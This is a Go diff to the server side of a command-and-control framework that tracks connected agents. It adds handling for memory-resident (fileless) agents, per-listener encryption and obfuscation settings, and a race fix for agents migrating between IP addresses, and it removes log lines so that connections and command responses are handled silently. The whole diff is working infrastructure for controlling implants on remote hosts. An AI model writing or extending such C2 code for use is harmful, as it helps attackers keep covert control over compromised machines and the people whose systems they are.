@@ -158,6 +158,14 @@ func ProcessWebSocket(conn *websocket.Conn, remoteAddr string, ln *globals.Liste
 			os, _ := p["os"].(string)
 			username, _ := p["username"].(string)
 			arch, _ := p["arch"].(string)
+			source, _ := p["source"].(string)
+			if source == "" { source = "disk" }
+
+			// Determine status based on source
+			status := "online"
+			if source == "memory" {
+				status = "memory_online"
+			}
 
 			// ⚡️ CRITICAL FIX: Upsert Agent to Database immediately
 			agentDBModel := &model.Agent{
@@ -167,7 +175,7 @@ func ProcessWebSocket(conn *websocket.Conn, remoteAddr string, ln *globals.Liste
 				OS:        os,
 				Username:  username,
 				Arch:      arch,
-				Status:    "online",
+				Status:    status,
 				LastSeen:  time.Now(),
 				EncryptionSalt:  ln.EncryptionSalt,
 				ObfuscationMode: ln.ObfuscateMode,
@@ -345,8 +353,15 @@ func ProcessTCPConnection(conn net.Conn, remoteAddr string, ln *globals.Listener
 				existingClient := val.(*globals.Client)
 				if existingClient == client {
 					globals.Clients.Delete(clientUUID)
-					store.UpdateAgentStatus(clientUUID, "offline")
-					log.Printf("Agent (Mapped TCP) Off: %s", clientUUID)
+					// Check current DB status to determine correct offline status
+					offlineStatus := "offline"
+					if agent, err := store.GetAgent(clientUUID); err == nil && agent != nil {
+						if agent.Status == "memory_online" {
+							offlineStatus = "memory_offline"
+						}
+					}
+					store.UpdateAgentStatus(clientUUID, offlineStatus)
+					log.Printf("\x1b[31m[-] Agent Offline\x1b[0m %s", clientUUID)
 					if client != nil {
 						NotifyAgentOffline(client.UUID, client.Hostname)
 					}
@@ -393,7 +408,7 @@ func ProcessTCPConnection(conn net.Conn, remoteAddr string, ln *globals.Listener
 		}()
 	}
 
-	log.Printf("[TCP] Starting message loop for %s", remoteAddr)
+	// Connection accepted silently
 	for {
 		// 🛡️ Anti-Slowloris: Set a read deadline for header (30s)
 		conn.SetReadDeadline(time.Now().Add(30 * time.Second))
@@ -401,7 +416,7 @@ func ProcessTCPConnection(conn net.Conn, remoteAddr string, ln *globals.Listener
 		// 1. Read Header (4 bytes length)
 		header := make([]byte, 4)
 		if _, err := io.ReadFull(conn, header); err != nil {
-			log.Printf("[TCP] Failed to read header from %s: %v", remoteAddr, err)
+			// Normal disconnect - don't spam logs
 			break
 		}
 		length := binary.BigEndian.Uint32(header)
@@ -475,33 +490,23 @@ func ProcessTCPConnection(conn net.Conn, remoteAddr string, ln *globals.Listener
 			os, _ := p["os"].(string)
 			username, _ := p["username"].(string)
 			arch, _ := p["arch"].(string)
+			source, _ := p["source"].(string)
+			if source == "" { source = "disk" }
+
+			// Determine status based on source
+			status := "online"
+			if source == "memory" {
+				status = "memory_online"
+			}
 
 			// 🚨 V3.0.1 Robustness: Close old connection if this agent is re-registering
-			if oldVal, ok := globals.Clients.Load(id); ok {
-				oldClient := oldVal.(*globals.Client)
-				log.Printf("[TCP] Agent %s re-registering (New IP: %s), clearing old session", id, remoteAddr)
-				if oldClient.TCPConn != nil { oldClient.TCPConn.Close() }
-				if oldClient.YamuxSession != nil { oldClient.YamuxSession.Close() }
-			}
-
-			// ⚡️ CRITICAL FIX: Upsert Agent to Database immediately
-			agentDBModel := &model.Agent{
-				UUID:      id,
-				Hostname:  hostname,
-				IP:        remoteAddr,
-				OS:        os,
-				Username:  username,
-				Arch:      arch,
-				Status:    "online",
-				LastSeen:  time.Now(),
-				EncryptionSalt:  ln.EncryptionSalt,
-				ObfuscationMode: ln.ObfuscateMode,
-			}
+			// ⚡ FIX: Store new client BEFORE closing old connection to prevent race condition
+			// where old connection's defer marks the agent offline after new one registers.
 			
-			if err := store.SaveAgent(agentDBModel); err != nil {
-				log.Printf("[DB] Failed to persist TCP agent %s: %v", id, err)
-			} else {
-				log.Printf("[DB] TCP Agent %s registered/updated successfully", id)
+			// Save reference to old client before overwriting
+			var oldClient *globals.Client
+			if oldVal, ok := globals.Clients.Load(id); ok {
+				oldClient = oldVal.(*globals.Client)
 			}
 
 			var ySession *yamux.Session
@@ -531,8 +536,35 @@ func ProcessTCPConnection(conn net.Conn, remoteAddr string, ln *globals.Listener
 			}
 			clientUUID = id
 
+			// Store new client FIRST (so old defer's equality check fails)
 			globals.Clients.Store(id, client)
-			log.Printf("Agent (TCP) On: [%s] via %s", id, remoteAddr)
+
+			// NOW close old connection safely
+			if oldClient != nil && oldClient != client {
+				log.Printf("\x1b[33m[~] Agent Migrating\x1b[0m %s → %s", id, remoteAddr)
+				if oldClient.TCPConn != nil { oldClient.TCPConn.Close() }
+				if oldClient.YamuxSession != nil { oldClient.YamuxSession.Close() }
+			}
+
+			// ⚡️ Upsert Agent to Database
+			agentDBModel := &model.Agent{
+				UUID:      id,
+				Hostname:  hostname,
+				IP:        remoteAddr,
+				OS:        os,
+				Username:  username,
+				Arch:      arch,
+				Status:    status,
+				LastSeen:  time.Now(),
+				EncryptionSalt:  ln.EncryptionSalt,
+				ObfuscationMode: ln.ObfuscateMode,
+			}
+			
+			if err := store.SaveAgent(agentDBModel); err != nil {
+				log.Printf("[DB] Failed to persist TCP agent %s: %v", id, err)
+			}
+
+			log.Printf("\x1b[32m[+] Agent Online\x1b[0m %s @ %s (source: %s)", id, remoteAddr, source)
 			NotifyAgentOnline(client.UUID, client.Hostname, client.IP, client.OS, client.Username)
 			startWriteLoop(client)
 
@@ -555,7 +587,7 @@ func ProcessTCPConnection(conn net.Conn, remoteAddr string, ln *globals.Listener
 						continue
 					}
 					go store.UpdateCommandOutput(resp.ReqID, resp.Stdout, resp.Stderr)
-					log.Printf("[C2 IO] Response received from Agent %s (ReqID: %s)", clientUUID, resp.ReqID)
+					// Response handled silently
 				}
 				output := resp.Stdout
 				if output == "" && resp.Stderr != "" {
